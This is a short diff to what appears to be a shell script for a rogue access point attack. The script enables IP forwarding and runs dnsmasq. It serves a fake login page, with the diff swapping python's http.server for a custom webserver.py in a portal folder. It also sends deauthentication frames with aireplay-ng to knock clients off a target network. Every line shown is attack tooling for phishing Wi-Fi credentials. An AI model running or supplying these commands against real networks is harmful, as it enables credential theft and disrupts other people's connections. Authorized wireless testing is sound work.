@@ -31,8 +31,10 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 dnsmasq -C dnsmasq.conf -d
 
 # Start a webserver to host the fake auth page
-# where fakeap/index.html is the fake login page
-python3 -m http.server -d fakeap 80
+# where portal/index.html is the fake login page
+cd portal
+python3 ../webserver.py
+cd ..
 
 # Deauth all clients
 aireplay-ng --deauth 1 -a $BSSID wlan0mon
